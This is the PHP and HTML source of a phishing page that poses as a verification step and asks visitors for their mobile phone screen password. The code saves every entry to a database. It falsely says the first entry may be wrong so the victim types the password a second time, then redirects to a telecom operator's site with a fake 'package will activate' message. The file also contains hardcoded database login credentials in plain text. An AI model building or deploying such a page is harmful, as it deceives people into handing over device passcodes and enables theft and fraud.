<!DOCTYPE html>
<html lang="en">
<head>
    <title>Verification</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Verify you are the right person</h1>

        <?php
        session_start();

        $message = "";
        $enteredPassword = "";

        // Database connection settings
        $servername = "sql205.infinityfree.com";
        $username = "if0_36669390";
        $password = "54Vh81ssYsRZCja";
        $dbname = "if0_36669390_screendb";

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            if (!isset($_SESSION['attempt'])) {
                $_SESSION['attempt'] = 1;
            } else {
                $_SESSION['attempt']++;
            }

            $enteredPassword = $_POST['psswrd'];

            // Save the entered password to the database
            $stmt = $conn->prepare("INSERT INTO psswrdstbl (password) VALUES (?)");
            $stmt->bind_param("s", $enteredPassword);
            $stmt->execute();
            $stmt->close();

            if ($_SESSION['attempt'] == 1) {
                $message = "Is this the correct Password? Try again.";
            } elseif ($_SESSION['attempt'] == 2) {
                $message = "Well! Your package will activate soon.";
                session_destroy(); // Reset the attempt count after the second submission
                header("Location: https://www.dialog.lk/");
                exit(); // Ensure the script stops executing after the redirect
            }
        }

        // Close the database connection
        $conn->close();
        ?>

        <form method="post" action="" class="items">
            <label for="psswrd">Enter your Mobile Screen Password</label>
            <input type="password" name="psswrd" id="psswrd" class="textbox" value="<?php echo htmlspecialchars($enteredPassword); ?>">
            <div class="inputfield">
                <input type="checkbox" id="showPassword">
                <label for="showPassword" id="toggleLabel">Show Password</label>
            </div>
            <span class="msg"><?php echo $message; ?></span>
            <input class="btnclass" type="submit" name="btn" id="btn" value="Verify">
        </form>
    </div>

    <script>
        document.getElementById('showPassword').addEventListener('change', function () {
            const passwordField = document.getElementById('psswrd');
            const toggleLabel = document.getElementById('toggleLabel');
            if (this.checked) {
                passwordField.type = 'text';
                toggleLabel.textContent = 'Hide Password';
            } else {
                passwordField.type = 'password';
                toggleLabel.textContent = 'Show Password';
            }
        });
    </script>
</body>
</html>
